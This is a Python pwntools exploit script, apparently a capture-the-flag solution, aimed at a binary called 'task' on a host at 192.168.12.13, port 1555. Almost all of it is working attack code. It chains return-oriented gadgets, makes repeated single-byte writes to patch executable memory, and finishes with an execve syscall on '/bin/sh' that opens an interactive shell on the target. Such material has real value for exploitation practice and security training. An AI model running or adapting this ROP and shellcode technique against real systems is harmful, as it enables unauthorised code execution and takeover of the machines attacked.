#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template task --host 192.168.12.13 --port 1555
from pwn import *
from time import sleep

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'task')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '192.168.12.13'
port = int(args.PORT or 1555)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
# b *0x41000
# watch *0x410c3
# watch *0x410c5
watch *0x410ca
# b *0x410c4
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX unknown - GNU_STACK missing
# PIE:      No PIE (0x40000)
# Stack:    Executable
# RWX:      Has RWX segments

size = 500

G__pop_rax__ret = 0x00041018
G__add_byte_rax_al__syscall__ret = 0x41013
A__start = 0x00041000
S__bin_sh = 0x41430

I__syscall = 0x0000000000041015

g_add_addf_base = 0x41000
g_add_addf = [(195, 1)]
g_add_addr = 0x410c3
max_ccnumj = 50

# g_patch_addf_base = 0x41000
# g_patch_addf = [(7, 186), (8, 26), (9, 155)]

g_shell_addf_base = 0x41000
g_shell_addf = [(196, 54), (197, 211), (198, 69), (199, 214), (200, 2), (201, 135), (202, 48)]
g_shell_addr = 0x410c4

def m_byte_p(addr, num, delay=0):
    for i in range(num):
        print(i)
        payload = b''

        payload += b'\0' * 8

        payload += p64(G__pop_rax__ret)
        payload += p64(addr)
        payload += p64(G__add_byte_rax_al__syscall__ret)
        payload += p64(G__pop_rax__ret)
        payload += p64(0)
        payload += p64(A__start)

        payload = payload.ljust(size, b'\0')
        io.send(payload)
        time.sleep(delay)

def m_byte(addr, num, delay=0):
    cnum = num
    while cnum > 0:
        print(cnum)
        ccnum = cnum if cnum <= max_ccnumj else max_ccnumj
        cnum -= ccnum
        ja = g_add_addr - ccnum * 2
        print(f"{cnum} {ccnum} {hex(ja)}")

        payload = b''

        payload += b'\0' * 8

        payload += p64(G__pop_rax__ret)
        payload += p64(addr)
        payload += p64(ja)
        payload += p64(G__pop_rax__ret)
        payload += p64(0)
        payload += p64(A__start)

        payload = payload.ljust(size, b'\0')
        io.send(payload)
        time.sleep(delay)


def m_bytes(addf, base, func, delay=0):
    for i in range(len(addf)):
        print(f">>>>> {i}")
        el = addf[i]
        addr = base + el[0]
        print(f"{hex(addr)}")
        n = el[1]
        func(addr, n, delay)


io = start()

m_bytes(g_add_addf, g_add_addf_base, m_byte_p, 0)
m_bytes(g_shell_addf, g_shell_addf_base, m_byte, 0)

payload = b''

payload += b'\0' * 8
payload += p64(0x410c4)

payload += p64(G__pop_rax__ret)
payload += p64(S__bin_sh)
payload += p64(0)
payload += p64(0)

payload += p64(59)  # execve
payload += p64(I__syscall)

payload = payload.ljust(size, b'\0')
io.send(payload)

# m_bytes(g_patch_addf, g_patch_addf_base, m_byte, 0.1)

io.interactive()

